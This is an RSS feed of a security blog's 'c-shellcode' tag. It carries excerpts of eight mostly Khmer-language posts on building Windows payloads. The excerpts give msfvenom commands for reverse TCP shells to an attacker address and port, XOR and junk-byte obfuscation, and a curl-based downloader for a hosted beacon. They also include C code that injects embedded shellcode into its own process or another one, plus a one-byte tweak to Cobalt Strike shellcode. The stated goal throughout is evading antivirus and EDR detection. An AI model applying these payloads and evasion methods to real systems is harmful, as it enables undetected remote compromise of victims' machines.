<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>c-shellcode on ThikLab - CyberSec</title>
    <link>https://th1k.github.io/en/tags/c-shellcode/</link>
    <description>Recent content in c-shellcode on ThikLab - CyberSec</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <managingEditor>leangputthik@protonmail.com (Thik)</managingEditor>
    <webMaster>leangputthik@protonmail.com (Thik)</webMaster>
    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2024 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
    <lastBuildDate>Wed, 09 Aug 2023 21:01:06 +0700</lastBuildDate>
    
        <atom:link href="https://th1k.github.io/en/tags/c-shellcode/index.xml" rel="self" type="application/rss+xml" />
    

      
      <item>
        <title>MSFvenom:- Raw2Shellcode and Remove Garbage</title>
        <link>https://th1k.github.io/en/posts/msfveom-raw2shellcode/</link>
        <pubDate>Wed, 09 Aug 2023 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Wed, 09 Aug 2023 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/msfveom-raw2shellcode/</guid>
        <description>ក្នុងអត្ថបទនេះយើងនឹងមកដឹងអំពីវិធីបំប្លែង​ឯកសារ Payload ឫ Beacons ផ្សេងៗដែលជាឯកសារប្រភេទ Raw ឲ្យទៅជា Shellcode ដើម្បីដាក់បញ្ចូលទៅក្នុងភាសារ C ក្នុងការបង្កើតជា Custom Payloads ជំនួសវិញ ។
Shellcode2Raw ខាងក្រោមនេះគឺជាគន្លឹះក្នុងការបំប្លែង Shellcode ទៅជាឯកសារ Raw ។
1  echo -ne &amp;#34;\x68\x62\x69\x3a\x00\x68[...]\x4b\x65\x6e\x6f\x68\x72&amp;#34; &amp;gt; raw.bin   Raw2Shellcode ខាងក្រោមនេះគឺជាគន្លឹះក្នុងការបំប្លែងឯកសារ Raw ទៅជា Shellcode វិញ ។
1  cat raw.bin | msfvenom -p - -a x64 --platform win -e x86/shikata_ga_nai -f c   ពន្យល់អំពី Parameters:-
 -p - ប្រាប់ទៅ msfvenom ឲ្យអានប្រភេទនៃ​ payload របស់ឯកសារចេញពី stdin ដែលបានមកពីការ cat raw.bin -a កំណត់ប្រភេទនៃ architecture (x64/x86) &amp;ndash;platform កំណត់ប្រភេទនែប្រព័ន្ធប្រតិបត្តិការ -e កំណត់ encoder របស់ payload (រំលងបាន) -f កំណត់ប្រភេទនៃ payload ដែលចង់បាន  Raw2Shellcode / Remove Garbage ខាងក្រោមនេះគឺជាគន្លឹះក្នុងការបំប្លែងឯកសារ Raw ទៅជា Shellcode វិញនិងផ្សំជាមួយការដកចេញនៅរាល់ចំនួនមិនបានការដូចជា \x00 ជាដើម ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>metasploit</category>
            
          
        
        
          
            
              <category>MSFvenom</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Encrypting Shellcode with XOR In C</title>
        <link>https://th1k.github.io/en/posts/encrypting-shellcode-with-xor-in-c/</link>
        <pubDate>Fri, 30 Jun 2023 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Fri, 30 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/encrypting-shellcode-with-xor-in-c/</guid>
        <description>Summary ខាងក្រោមជាការបង្កើត Shellcode និងធ្វើកូដនីយកម្ម XOR ដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។
Generate Shellcode ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅនៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   Create XOR Encryption 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  #include &amp;lt;stdio.h&amp;gt;unsigned char code[] = &amp;#34;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&amp;#34; &amp;#34;\x51\x48\x3\xd2\x65\x48\[Original Shellcode]\x8b\x52\x18\x48&amp;#34; &amp;#34;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&amp;#34;; int main() { char key = &amp;#39;K&amp;#39;; // RIGHT  // char key = &amp;#34;K&amp;#34;; // WRONG  int i = 0; for (i; i&amp;lt;sizeof(code); i++) { printf(&amp;#34;\\x%02x&amp;#34;,code[i]^key); } }   Compile កូដខាងលើនោះយើងនឹងទទួលបាន Encryption Strings ថ្មីមួយ សូមចម្លងវាទុកដើម្បីដាក់ចូលទៅក្នុងកូដខាងក្រោមដើម្បី Decrypt កូដខាងលើ ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature2/bam.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>bypass</category>
            
          
            
              <category>xor</category>
            
          
        
        
          
            
              <category>Process Injection</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Evading AV/EDR with Curl Command</title>
        <link>https://th1k.github.io/en/posts/evading-avedr-with-c-curl-command/</link>
        <pubDate>Thu, 29 Jun 2023 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Thu, 29 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/evading-avedr-with-c-curl-command/</guid>
        <description>ខ្លីៗអំពីការ Bypass AV/EDR តាមរយៈពាក្យបញ្ជា Curl ដោយប្រើប្រាស់ភាសា C ។
Generate Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាឯកសារ Raw គោលដៅលើម៉ាស៊ីន 64 bit ។
បញ្ជាក់៖ Payload នេះដំណើរការតែក្នុងម៉ាស៊ីនវីនដូ ៨/10/11 ឡើងប៉ុណ្ណោះ ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f raw -o cat.bin   Live Payload ក្រោយពីបង្កើត Payload រួចយើងបង្កើត Server ដើម្បីបង្ហោះវាក្នុងគោលបំណងទាញយកមកប្រើប្រាស់វិញនៅជំហ៊ានបន្ទាប់ ។
1  python3 -m http.server -d payloadDir 8000   PWN The Code តស់ចាប់ផ្ដើមបង្កើត FUD Payload ដោយប្រើប្រាស់ពាក្យបញ្ជា Curl ក្នុងភាសារ C ដើម្បីទាញយក Beacon និងបើកដំណើរការពីចំងាយ ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>metasploit</category>
            
          
        
        
          
            
              <category>Evading</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Evading AV/EDR with Junk Bytes</title>
        <link>https://th1k.github.io/en/posts/evading-avedr-with-junk-bytes/</link>
        <pubDate>Tue, 27 Jun 2023 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Tue, 27 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/evading-avedr-with-junk-bytes/</guid>
        <description>ខ្លះៗអំពីការ Bypass AV/EDR តាមរយៈ Msfvenom ។
Generate Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit និងបានថែមនូវពាក្យបញ្ជា -n ក្នុងន័យបង្កើតចំនួន Bytes ដែលមិនបានការដើម្បីព្យាយាមបង្វៀងពីការចាប់របស់ AV ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c -n 10000   ចំណាំ៖ ក្រោយ -n យើងអាចដាក់ចំនួនលេខកាន់តែច្រើនគឺមានលទ្ធភាពក្នុងការ Bypass បានកាន់តែច្រើន ។
បន្ទាប់មកយើងនឹង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;stdio.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>metasploit</category>
            
          
        
        
          
            
              <category>Evading</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Process Injection - Bypass AV/EDR with XOR - 0x01</title>
        <link>https://th1k.github.io/en/posts/process-injection-bypass-avedr-with-xor-0x01/</link>
        <pubDate>Wed, 21 Jun 2023 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Wed, 21 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/process-injection-bypass-avedr-with-xor-0x01/</guid>
        <description>Summary នៅក្នុងអត្ថបទនេះយើងនឹងធ្វើការបង្កើត Shellcode តាមរយៈវិធីសាស្ត្រ Process Injection ដោយភ្ជាប់ជាមួយនិងការដាក់នូវកូនសោរ XOR ក្នុងការធ្វើកូដនីយកម្មដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។
Shellcode ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅនៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   XOR Shellcode បន្ទាប់មកយើងនឹងធ្វើការ XOR ទៅលើកូដនោះដោយប្រើប្រាស់ Python Script ដូចខាងក្រោម៖
1 2 3 4 5 6 7 8 9 10  raw_shellcode = &amp;#34;my shellcode \xaa\xda\xca\[...]\xbe\x14\x49&amp;#34; enc_shellcode = [] print (&amp;#34;[+] Shellcode is encoding&amp;#34;) for opcode in raw_shellcode: enc_opcode = (ord(opcode) ^ 0x41) enc_shellcode.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature2/bam.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>bypass</category>
            
          
            
              <category>xor</category>
            
          
        
        
          
            
              <category>Process Injection</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Process Injection without Write/Execute Permission</title>
        <link>https://th1k.github.io/en/posts/process-injection-without-write-exec-permission/</link>
        <pubDate>Wed, 21 Jun 2023 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Wed, 21 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/process-injection-without-write-exec-permission/</guid>
        <description>Pwn Self Injection បង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   ខាងក្រោមជាវិធីសាស្ត្រសម្រាប់ចាក់ Process ចូលទៅកាន់ PID ណាមួយដោយមិនមាន DEP protection និងមិនមានសិទ្ធក្នុងការសរសេរចូល ឬដំណើរការបាន (Non-Writable / Non-Executable Allocation) ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;Windows.h&amp;gt; int main(int argc, char* argv[]) { unsigned char shellcode[] = &amp;#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&amp;#34; &amp;#34;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&amp;#34; &amp;#34;\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&amp;#34; &amp;#34;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&amp;#34;; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; DWORD oldPerms; DWORD PID = 1524; printf(&amp;#34;Injecting to PID: %i&amp;#34;, PID); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ); WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, &amp;amp;oldPerms); remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); return 0; }   កែត្រង់ PID បន្ទាប់មក Compile កូដខាងលើតាមធម្មតា (សម្រាប់ Visual Studio 20xx តម្រូវឲ្យធ្វើការបិទ DEP Protection មុននិង Build) បន្ទាប់មកសូមសាកល្បងបើកដំណើរការ ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
        
        
          
            
              <category>Process Injection</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Process Injection - Self Injection Method</title>
        <link>https://th1k.github.io/en/posts/process-injection-self-injection-method/</link>
        <pubDate>Tue, 20 Jun 2023 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Tue, 20 Jun 2023 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/process-injection-self-injection-method/</guid>
        <description>Self-Injection Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។
1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   បន្ទាប់មកយើងនឹង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;Windows.h&amp;gt; int main() { unsigned char shellcode[] = &amp;#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&amp;#34; &amp;#34;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&amp;#34; &amp;#34;\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&amp;#34; &amp;#34;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&amp;#34;; void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }   ដើម្បី Compile យើងអាចប្រើប្រាស់កម្មវិធីផ្សេងៗជាច្រើន តែសម្រាប់ខ្ញុំៗប្រើប្រាស់ Embarcadero Dev-C++ ដើម្បីដំណើរការបង្កើត ។</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
        
        
          
            
              <category>Process Injection</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>1 Byte Changed Evading Antivirus</title>
        <link>https://th1k.github.io/en/posts/1byte-changed-evading-av/</link>
        <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
        <author>leangputthik@protonmail.com (Thik)</author>
        <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
        <guid>https://th1k.github.io/en/posts/1byte-changed-evading-av/</guid>
        <description>1 Byte Evading ដំបូងយើងត្រូវបង្កើត Shell Code ជាប្រភេទភាសារ C នៅក្នុង Cobalt Strike ដូចរូបខាងក្រោម៖
សូមចាប់អារម្មណ៏ត្រង់ Byte ដំបូងគេនៃ Code គឺ \xfc ។
តស់!!! មកកែប្រែចំនួន Byte ដូចខាងក្រោម៖
ប្ដូរ \xfc ទៅជាចំនួនតម្លៃ Byte ផ្សេង។ ឧ. \xfd, \x3a, \x6f\ ។ល។រក្សាតម្លៃដើមដែលត្រឹមត្រូវនៅក្នុង Char Variable = char first[] = &#34;\xfc&#34;;Build ឯកសារ exe ជាមួយកម្មវិធីអានកូដជាការស្រេច។ខាងក្រោមជា Source Code សម្រាប់អ្នកដែលចង់សាកល្បងវិធីសាស្ត្រមួយនេះ៕
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //payload.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://th1k.github.ioimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>c-shellcode</category>
            
          
            
              <category>bypass</category>
            
          
        
        
        
          
            
              <category>CobaltStrike</category>
            
          
        
      </item>
      

    
  </channel>
</rss>
